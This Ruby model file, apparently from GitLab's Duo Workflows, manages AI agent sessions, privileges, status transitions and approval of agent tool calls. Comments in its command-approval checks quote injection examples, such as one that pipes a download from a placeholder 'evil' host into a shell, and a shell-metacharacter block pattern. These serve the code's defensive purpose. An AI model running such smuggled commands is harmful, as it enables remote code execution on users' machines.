# frozen_string_literal: true

require 'shellwords'

module Ai
  module DuoWorkflows
    class Workflow < ::ApplicationRecord
      include AfterCommitQueue
      include Gitlab::SQL::Pattern
      include FromUnion
      include EachBatch
      include Sortable
      include Todoable

      WORKLOAD_TAG = 'gitlab--duo'
      TITLE_MAX_LENGTH = 40
      GOAL_MAX_LENGTH = 16_384
      IMAGE_MAX_LENGTH = 2048
      SUMMARY_MAX_LENGTH = 1_024

      self.table_name = :duo_workflows_workflows

      belongs_to :user
      belongs_to :project, optional: true
      belongs_to :namespace, optional: true
      belongs_to :ai_catalog_item, optional: true, class_name: 'Ai::Catalog::Item'
      belongs_to :ai_catalog_item_version, optional: true, class_name: 'Ai::Catalog::ItemVersion'
      belongs_to :issue, optional: true
      belongs_to :work_item, optional: true, foreign_key: :issue_id, class_name: 'WorkItem', inverse_of: false
      belongs_to :merge_request, optional: true
      belongs_to :service_account, optional: true, class_name: 'User'

      has_many :checkpoints, class_name: 'Ai::DuoWorkflows::Checkpoint'
      # Lightweight association that excludes large jsonb columns (checkpoint,
      # metadata, ui_chat_log). Use this instead of :checkpoints when full
      # checkpoint data is not needed (e.g. presence checks, sorting by ts).
      has_many :basic_checkpoints,
        -> { select(:id, :workflow_id, :created_at, :thread_ts) },
        class_name: 'Ai::DuoWorkflows::Checkpoint',
        inverse_of: :workflow
      has_many :checkpoint_writes, class_name: 'Ai::DuoWorkflows::CheckpointWrite'
      has_many :checkpoint_blobs, class_name: 'Ai::DuoWorkflows::CheckpointBlob'
      has_many :events, class_name: 'Ai::DuoWorkflows::Event'
      has_many :workflows_workloads, class_name: 'Ai::DuoWorkflows::WorkflowsWorkload'
      has_many :workloads, through: :workflows_workloads, disable_joins: true
      has_many :work_item_links, class_name: 'Ai::DuoWorkflows::WorkflowWorkItem'
      has_many :linked_work_items, through: :work_item_links, source: :work_item, disable_joins: true
      has_many :merge_request_links, class_name: 'Ai::DuoWorkflows::WorkflowMergeRequest'
      has_many :linked_merge_requests, through: :merge_request_links, source: :merge_request, disable_joins: true
      has_many :note_links, class_name: 'Ai::DuoWorkflows::WorkflowNote'
      has_many :linked_notes, through: :note_links, source: :note, disable_joins: true
      has_many :vulnerability_triggered_workflows, class_name: '::Vulnerabilities::TriggeredWorkflow'

      validates :status, presence: true
      validates :goal, length: { maximum: GOAL_MAX_LENGTH }
      validates :image, length: { maximum: IMAGE_MAX_LENGTH }, allow_blank: true
      validates :summary, length: { maximum: SUMMARY_MAX_LENGTH }, allow_blank: true
      validates :title, length: { maximum: TITLE_MAX_LENGTH }, allow_blank: true

      validate :only_known_agent_privileges
      validate :only_known_pre_approved_agent_privileges
      validate :pre_approved_privileges_included_in_agent_privileges, on: :create
      validate :valid_service_account_user
      validate :item_matches_version

      before_create :set_title_from_workflow_definition, if: -> { title.blank? }

      validates :tool_call_approvals,
        json_schema: { filename: 'duo_tool_call_approvals', size_limit: 64.kilobytes }

      validates :messaging_callback_context,
        json_schema: { filename: 'duo_messaging_callback_context', size_limit: 16.kilobytes },
        allow_nil: true

      # `ide` is deprecated in favor of `chat`
      # `web` is deprecated in favor of `ambient`
      enum :environment, { ide: 1, web: 2, chat_partial: 3, chat: 4, ambient: 5 }

      scope :for_user_with_id!, ->(user_id, id) { find_by!(user_id: user_id, id: id) }
      scope :for_user, ->(user_id) { where(user_id: user_id) }
      scope :for_project, ->(project) { where(project: project) }
      scope :for_merge_request, ->(merge_request) { where(merge_request_id: merge_request) }
      scope :in_namespace, ->(namespace) {
        namespace_ids = namespace.self_and_descendants.select(:id)
        project_ids = ::Project.in_namespace(namespace_ids).select(:id)
        where(project_id: project_ids).or(where(namespace_id: namespace.id))
      }
      scope :stale_since, ->(time) { where(updated_at: ...time).order(updated_at: :asc, id: :asc) }
      scope :with_workflow_definition, ->(definition) { where(workflow_definition: definition) }
      scope :without_workflow_definition, ->(definition) { where.not(workflow_definition: definition) }
      scope :with_environment, ->(environment) { where(environment: environment) }
      scope :from_pipeline, -> do
        without_workflow_definition(::Ai::FoundationalChatAgent.workflow_definitions)
          .with_environment(ENVIRONMENTS_FROM_PIPELINE)
      end
      scope :in_status_group, ->(status_group) do
        statuses_in_group = GROUPED_STATUSES.fetch(status_group.to_sym, [])

        if statuses_in_group.empty?
          none
        else
          state_machine_states = state_machines[:status].states
          status_db_values = statuses_in_group.map { |status| state_machine_states[status.to_sym].value }
          where(status: status_db_values)
        end
      end
      scope :order_by_status, ->(direction) do
        status_order_expression = Arel::Nodes::NamedFunction.new(
          'ARRAY_POSITION',
          [
            Arel.sql("ARRAY#{ordered_statuses}::smallint[]"),
            arel_table[:status]
          ]
        )

        final_order_expression =
          if direction.to_s.casecmp?('desc')
            status_order_expression.desc
          else
            status_order_expression.asc
          end

        order = Gitlab::Pagination::Keyset::Order.build([
          Gitlab::Pagination::Keyset::ColumnOrderDefinition.new(
            attribute_name: 'status',
            column_expression: status_order_expression,
            order_expression: final_order_expression,
            order_direction: direction,
            nullable: :not_nullable
          ),
          # Tie-breaker for deterministic ordering
          Gitlab::Pagination::Keyset::ColumnOrderDefinition.new(
            attribute_name: 'id',
            order_expression: arel_table[:id].desc,
            nullable: :not_nullable
          )
        ])

        reorder(order)
      end
      scope :updated_after, ->(time) { where(updated_at: time..) }
      scope :with_preloaded_associations, -> {
        preload(:project, :user, :namespace, :basic_checkpoints, ai_catalog_item_version: :item)
      }

      TARGET_STATUSES = {
        start: :running,
        pause: :paused,
        require_input: :input_required,
        require_plan_approval: :plan_approval_required,
        require_tool_call_approval: :tool_call_approval_required,
        resume: :running,
        retry: :running,
        finish: :finished,
        drop: :failed,
        stop: :stopped
      }.freeze

      GROUPED_STATUSES = {
        active: [:created, :running],
        paused: [:paused],
        awaiting_input: [:input_required, :plan_approval_required, :tool_call_approval_required],
        completed: [:finished],
        failed: [:failed],
        canceled: [:stopped]
      }.freeze

      TERMINAL_STATUSES = %i[finished failed stopped].freeze

      ENVIRONMENTS_FROM_PIPELINE = %w[web ambient].freeze
      ENVIRONMENTS_DEPRECATIONS = {
        'ide' => 'chat',
        'web' => 'ambient'
      }.freeze

      class AgentPrivileges
        READ_WRITE_FILES  = 1
        READ_ONLY_GITLAB  = 2
        READ_WRITE_GITLAB = 3
        RUN_COMMANDS      = 4
        USE_GIT           = 5
        RUN_MCP_TOOLS     = 6
        START_FLOWS       = 7
        READ_ONLY_FILES   = 8

        ALL_PRIVILEGES = {
          READ_WRITE_FILES => {
            name: "read_write_files",
            description: "Allow local filesystem read/write access"
          }.freeze,
          READ_ONLY_GITLAB => {
            name: "read_only_gitlab",
            description: "Allow read only access to GitLab APIs"
          }.freeze,
          READ_WRITE_GITLAB => {
            name: "read_write_gitlab",
            description: "Allow write access to GitLab APIs"
          }.freeze,
          RUN_COMMANDS => {
            name: "run_commands",
            description: "Allow running any commands"
          }.freeze,
          USE_GIT => {
            name: "use_git",
            description: "Allow git commits, push and other git commands"
          }.freeze,
          RUN_MCP_TOOLS => {
            name: "run_mcp_tools",
            description: "Allow running MCP tools"
          }.freeze,
          START_FLOWS => {
            name: "start_flows",
            description: "Allow starting foundational flows from chat"
          }.freeze,
          READ_ONLY_FILES => {
            name: "read_only_files",
            description: "Allow local filesystem read access"
          }.freeze
        }.freeze

        DEFAULT_PRIVILEGES = [
          READ_WRITE_FILES,
          READ_ONLY_GITLAB,
          READ_WRITE_GITLAB,
          RUN_COMMANDS,
          USE_GIT,
          RUN_MCP_TOOLS
        ].freeze
      end

      # Value object for managing tool call approvals stored in JSONB
      class ToolCallApprovals
        CALL_ARGS_KEY = 'call_args'
        PATTERNS_KEY = 'patterns'
        COMMAND_TOOL_NAME = 'run_command'
        GIT_COMMAND_TOOL_NAME = 'run_git_command'
        COMMAND_TOOL_NAMES = [COMMAND_TOOL_NAME, GIT_COMMAND_TOOL_NAME].freeze
        MAX_PATTERNS_PER_TOOL = 100
        MAX_PATTERN_LENGTH = 256
        SHELL_METACHARACTERS = /[;&|<>$`(){}]/

        def initialize(data = {})
          @approvals = data.dup
        end

        def add_approval(tool_name:, call_args:)
          call_args_hash = hash_call_args(call_args)
          @approvals[tool_name] ||= { CALL_ARGS_KEY => [] }

          # Handle both Set (in-memory) and Array (from JSONB) cases
          call_args_set = Set.new(@approvals[tool_name][CALL_ARGS_KEY])
          call_args_set.add(call_args_hash)
          @approvals[tool_name][CALL_ARGS_KEY] = call_args_set.to_a
        end

        def add_pattern_approval(tool_name:, pattern:)
          validate_pattern!(pattern)
          validate_command_tool_pattern!(tool_name, pattern)

          @approvals[tool_name] ||= { CALL_ARGS_KEY => [] }
          @approvals[tool_name][PATTERNS_KEY] ||= []

          patterns_set = Set.new(@approvals[tool_name][PATTERNS_KEY])
          patterns_set.add(pattern)

          if patterns_set.size > MAX_PATTERNS_PER_TOOL
            raise ArgumentError, "Maximum of #{MAX_PATTERNS_PER_TOOL} patterns per tool"
          end

          @approvals[tool_name][PATTERNS_KEY] = patterns_set.to_a
        end

        def approved?(tool_name:, call_args:)
          tool_approvals = @approvals[tool_name]
          return false unless tool_approvals

          # Exact match always works -- this is the user's deliberate choice
          call_args_hash = hash_call_args(call_args)
          return true if tool_approvals[CALL_ARGS_KEY]&.include?(call_args_hash)

          match_target = extract_match_target(tool_name, call_args)

          is_command_tool = COMMAND_TOOL_NAMES.include?(tool_name)

          # For command tools, validate the command is safe for pattern-based
          # approval. This combines two checks in a single tokenization pass:
          # 1. Reject shell metacharacters (prevents "git checkout main; curl evil | sh")
          # 2. Validate program-specific structure (prevents "git -c core.sshCommand=evil fetch")
          return false if is_command_tool && !command_safe_for_pattern_approval?(match_target)

          tool_approvals[PATTERNS_KEY]&.any? do |pattern|
            if is_command_tool
              CommandPatternMatcher.match?(pattern, match_target)
            else
              File.fnmatch(pattern, match_target, File::FNM_DOTMATCH)
            end
          end || false
        end

        def to_h
          @approvals
        end

        def [](key)
          @approvals[key]
        end

        def []=(key, value)
          @approvals[key] = value
        end

        def each
          @approvals.each { |tool_name, approval| yield tool_name, approval }
        end

        def empty?
          @approvals.empty?
        end

        def keys
          @approvals.keys
        end

        private

        # Checks whether the string contains shell metacharacters.
        # Used by both pattern validation (add_pattern_approval) and
        # the unified approval check (command_safe_for_pattern_approval?).
        def command_contains_shell_metacharacters?(match_target)
          return true if match_target.match?(/[\n\r]/)

          tokens = Shellwords.split(match_target)
          tokens.any? { |token| token.match?(SHELL_METACHARACTERS) }
        rescue ArgumentError
          # Unbalanced quotes - reject
          true
        end

        # Validates a command is safe for pattern-based approval.
        # Checks metacharacters first, then delegates to the program-specific
        # validator. Unregistered programs fail closed (exact-match only).
        def command_safe_for_pattern_approval?(match_target)
          return false if command_contains_shell_metacharacters?(match_target)

          tokens = Shellwords.split(match_target)
          return true if tokens.empty?

          program = tokens.first
          return false unless CommandValidators::Registry.registered?(program)

          validator = CommandValidators::Registry.validator_for(program)
          validator.safe_for_pattern_matching?(program: program, tokens: tokens[1..])
        rescue ArgumentError
          # Unbalanced quotes - reject (fail closed)
          false
        end

        # Extracts the string that patterns are matched against.
        # For command tools (run_command, run_git_command), returns the command
        # string so that users can write intuitive patterns like 'git checkout *'.
        # For all other tools, returns the raw call_args string.
        def extract_match_target(tool_name, call_args)
          return call_args unless tool_name == COMMAND_TOOL_NAME || tool_name == GIT_COMMAND_TOOL_NAME

          parsed = begin
            Gitlab::Json.safe_parse(call_args)
          rescue JSON::ParserError, EncodingError
            nil
          end
          return call_args unless parsed.is_a?(Hash)

          if tool_name == GIT_COMMAND_TOOL_NAME
            command = parsed['command'].to_s
            args = parsed['args']
            # join(' ') flattens array elements; args with embedded spaces merge
            # into the token stream. Not a security issue (metacharacter check
            # still applies) but patterns may not match as the user expects.
            args_str = args.is_a?(Array) ? args.join(' ') : args.to_s
            parts = ["git", command]
            parts << args_str if args_str.present?
            parts.join(' ')
          elsif parsed.key?('command')
            parsed['command'].to_s
          elsif parsed.key?('program')
            program = parsed['program'].to_s
            args = parsed['args']
            args_str = args.is_a?(Array) ? args.join(' ') : args.to_s
            args_str.present? ? "#{program} #{args_str}" : program
          else
            call_args
          end
        end

        def validate_pattern!(pattern)
          raise ArgumentError, "Pattern must be a non-empty string" unless pattern.is_a?(String) && !pattern.empty?

          return unless pattern.length > MAX_PATTERN_LENGTH

          raise ArgumentError, "Pattern must not exceed #{MAX_PATTERN_LENGTH} characters"
        end

        def validate_command_tool_pattern!(tool_name, pattern)
          return unless COMMAND_TOOL_NAMES.include?(tool_name)

          # Use Shellwords.split consistently with CommandPatternMatcher to
          # prevent shell-quoting bypasses (e.g. '"*"' or '"**"' evading
          # plain String#split checks). Parse failures fall through to the
          # metacharacter check which rejects unbalanced quotes.
          tokens = begin
            Shellwords.split(pattern)
          rescue ArgumentError
            nil
          end

          if tokens
            raise ArgumentError, "Wildcard-only patterns are not allowed for command tools" if tokens == ['*']

            # Block any pattern containing ** as a token. Leading ** (e.g. "** checkout")
            # bypasses the flag-rejection intent of constrained wildcards, and the gateway
            # only generates * patterns today. ** is reserved for future config-file use.
            raise ArgumentError, "Double wildcard (**) patterns are not allowed for command tools" if tokens.any?('**')
          end

          return unless command_contains_shell_metacharacters?(pattern)

          raise ArgumentError,
            "Patterns for command tools must not contain shell metacharacters (;, &, |, <, >, $, `, newlines, etc.)"
        end

        # Returns SHA256 hash of tool call args for storage
        # This ensures predictable payload size and allows equality comparison between different call args
        def hash_call_args(call_args)
          ::Digest::SHA256.hexdigest(call_args)
        end
      end

      # Scoped lookups for the compliance agent-artifacts download. The Workflow
      # is the source of truth present in Postgres on every instance, so reading
      # it directly works regardless of whether session analytics are backed by
      # Postgres or ClickHouse (the denormalized SessionArtifact table is only
      # populated when ClickHouse analytics are disabled).
      def self.find_in_project(project, id)
        for_project(project).find_by(id: id)
      end

      def self.find_in_namespace(namespace, id)
        in_namespace(namespace).find_by(id: id)
      end

      def self.target_status_for_event(status_event)
        TARGET_STATUSES[status_event]
      end

      # Evaluated once at workflow creation and snapshotted into the
      # incremental_checkpoints_enabled column (see CreateWorkflowService).
      # The flag must not change over a workflow's lifetime: incremental
      # checkpoint blobs are folded as deltas, so toggling mid-flight would
      # leave a chain that can't be reconstructed.
      def self.incremental_checkpoints_enabled_for?(resource_parent)
        return false unless resource_parent

        Feature.enabled?(:duo_workflow_incremental_checkpoints, resource_parent) ||
          Feature.enabled?(:duo_workflow_incremental_checkpoints, resource_parent.root_ancestor)
      end

      def self.ordered_statuses
        statuses_values = state_machines[:status].states

        GROUPED_STATUSES.flat_map do |_group, statuses|
          statuses.map do |status|
            statuses_values.fetch(status).value
          end
        end
      end

      def only_known_agent_privileges
        self.agent_privileges ||= AgentPrivileges::DEFAULT_PRIVILEGES

        agent_privileges.each do |privilege|
          unless AgentPrivileges::ALL_PRIVILEGES.key?(privilege)
            errors.add(:agent_privileges, "contains an invalid value #{privilege}")
          end
        end
      end

      def chat?
        ::Ai::FoundationalChatAgent.foundational_workflow_definition?(workflow_definition)
      end

      def noteable
        noteable = issue.presence || merge_request.presence
        return unless noteable.respond_to?(:project) && noteable.project.present?

        noteable
      end

      # Flows that manage their own session notes (e.g. Code Review) opt out of
      # the generic agent-session-started/completed/failed system notes.
      def suppress_agent_session_note?
        !!::Ai::Catalog::FoundationalFlow[workflow_definition]&.suppress_agent_session_note
      end

      def from_pipeline?
        return false if chat?

        environment.in?(ENVIRONMENTS_FROM_PIPELINE)
      end

      def archived?
        created_at <= CHECKPOINT_RETENTION_DAYS.days.ago
      end

      def stalled?
        !created? && basic_checkpoints.empty?
      end

      def last_executor_logs_url
        last_workload&.logs_url
      end

      def all_executor_logs_urls
        workloads.order(created_at: :desc).filter_map(&:logs_url)
      end

      def last_workload
        @last_workload ||= workloads.order(created_at: :desc).first
      end

      # Intentionally avoids `last_workload` to prevent returning a stale memoized
      # workload when this method and `last_workload` are both called on the same object.
      def last_workload_pipeline_status
        workloads.order(created_at: :desc).first&.pipeline&.status&.to_sym
      end

      def project_level?
        project_id.present?
      end

      def namespace_level?
        namespace_id.present?
      end

      def resource
        issue || merge_request
      end

      def resource_iid
        resource&.iid
      end

      def resource_web_url
        return unless resource

        Gitlab::UrlBuilder.build(resource)
      end

      def resource_parent
        project || namespace
      end

      def to_ability_name
        'duo_workflow'
      end

      # Atomically merge a partial update into the messaging_callback_context
      # jsonb column (Postgres `||`, not a Ruby read-modify-write) so concurrent
      # writers -- e.g. the progress cursor vs an adapter's status_ts -- don't
      # clobber each other's keys. Like update_column, this bypasses the column's
      # json_schema validation.
      def merge_messaging_callback_context!(attrs)
        self.class.where(id: id).update_all(
          ActiveRecord::Base.sanitize_sql_array([
            "messaging_callback_context = COALESCE(messaging_callback_context, '{}'::jsonb) || ?::jsonb",
            Gitlab::Json.dump(attrs)
          ])
        )

        # Best-effort in-memory sync; the DB row is authoritative.
        self.messaging_callback_context = (messaging_callback_context || {}).merge(attrs.stringify_keys)
      end

      def associated_pipelines
        workloads.includes(:pipeline).filter_map(&:pipeline).uniq
      end

      def mcp_enabled?
        return true if resource_parent.root_ancestor.duo_workflow_mcp_enabled

        false
      end

      def status_group
        GROUPED_STATUSES.find do |_group, statuses|
          statuses.include?(status_name)
        end&.first
      end

      # Whether the flow has finished (success, failure, or cancellation). Used as
      # the authoritative "terminal owns the surface now" signal so live-progress
      # streaming stops once the flow is done -- no separate flag to keep in sync.
      def status_terminal?
        TERMINAL_STATUSES.include?(status_name)
      end

      def web_url
        return unless project_level?

        "#{Gitlab::Routing.url_helpers.project_automate_agent_sessions_url(project)}/#{id}"
      end

      def add_tool_call_approval(tool_name:, call_args:)
        approvals = ToolCallApprovals.new(tool_call_approvals || {})
        approvals.add_approval(tool_name: tool_name, call_args: call_args)
        self.tool_call_approvals = approvals.to_h
      end

      def add_tool_call_pattern_approval(tool_name:, pattern:)
        approvals = ToolCallApprovals.new(tool_call_approvals || {})
        approvals.add_pattern_approval(tool_name: tool_name, pattern: pattern)
        self.tool_call_approvals = approvals.to_h
      end

      private

      def set_title_from_workflow_definition
        self.title = workflow_definition.truncate(TITLE_MAX_LENGTH)
      end

      def valid_service_account_user
        return if service_account.nil?
        return if service_account.service_account?

        errors.add(:service_account, 'must be a service account user')
      end

      def item_matches_version
        return if ai_catalog_item_id.nil? || ai_catalog_item_version_id.nil?
        return if ai_catalog_item_version&.ai_catalog_item_id == ai_catalog_item_id

        errors.add(:ai_catalog_item_id, 'must match the catalog item of the version')
      end

      def only_known_pre_approved_agent_privileges
        return if pre_approved_agent_privileges.nil?

        pre_approved_agent_privileges.each do |privilege|
          next if AgentPrivileges::ALL_PRIVILEGES.key?(privilege)

          errors.add(:pre_approved_agent_privileges, "contains an invalid value #{privilege}")
        end
      end

      def pre_approved_privileges_included_in_agent_privileges
        # both columns will use db default values which are equal
        return if pre_approved_agent_privileges.nil? && agent_privileges.nil?

        pre_approved_privileges_with_defaults = pre_approved_agent_privileges || AgentPrivileges::DEFAULT_PRIVILEGES
        agent_privileges_with_defaults = agent_privileges || AgentPrivileges::DEFAULT_PRIVILEGES

        pre_approved_privileges_with_defaults.each do |privilege|
          next if agent_privileges_with_defaults.include?(privilege)

          errors.add(
            :pre_approved_agent_privileges,
            "contains privilege #{privilege} not present in agent_privileges"
          )
        end
      end

      state_machine :status, initial: :created do
        event :start do
          transition created: ::Ai::DuoWorkflows::Workflow.target_status_for_event(:start)
        end

        # Fires only on the initial start (created -> running), not on resume/retry.
        # Scoped to messaging-triggered workflows so we don't emit for every CI workflow.
        after_transition on: :start do |workflow|
          next unless workflow.messaging_callback_context.present?

          workflow.run_after_commit do
            ::Gitlab::EventStore.publish(
              ::Ai::DuoWorkflows::WorkflowStartedEvent.new(data: { workflow_id: workflow.id })
            )
          end
        end

        event :pause do
          transition running: ::Ai::DuoWorkflows::Workflow.target_status_for_event(:pause)
        end

        event :require_input do
          transition running: ::Ai::DuoWorkflows::Workflow.target_status_for_event(:require_input)
        end

        event :require_plan_approval do
          transition running: ::Ai::DuoWorkflows::Workflow.target_status_for_event(:require_plan_approval)
        end

        event :require_tool_call_approval do
          transition running: ::Ai::DuoWorkflows::Workflow.target_status_for_event(:require_tool_call_approval)
        end

        event :resume do
          transition [
            :paused,
            :input_required,
            :plan_approval_required,
            :tool_call_approval_required
          ] => ::Ai::DuoWorkflows::Workflow.target_status_for_event(:resume)
        end

        event :retry do
          transition [:running, :stopped, :failed] => ::Ai::DuoWorkflows::Workflow.target_status_for_event(:retry)
        end

        event :finish do
          transition running: ::Ai::DuoWorkflows::Workflow.target_status_for_event(:finish)
        end

        event :drop do
          transition [
            :created,
            :running,
            :paused,
            :input_required,
            :plan_approval_required,
            :tool_call_approval_required
          ] => ::Ai::DuoWorkflows::Workflow.target_status_for_event(:drop)
        end

        event :stop do
          transition [
            :created,
            :running,
            :paused,
            :input_required,
            :plan_approval_required,
            :tool_call_approval_required
          ] => ::Ai::DuoWorkflows::Workflow.target_status_for_event(:stop)
        end

        state :created, value: 0
        state :running, value: 1
        state :paused, value: 2
        state :finished, value: 3
        state :failed, value: 4
        state :stopped, value: 5
        state :input_required, value: 6
        state :plan_approval_required, value: 7
        state :tool_call_approval_required, value: 8
      end
    end
  end
end
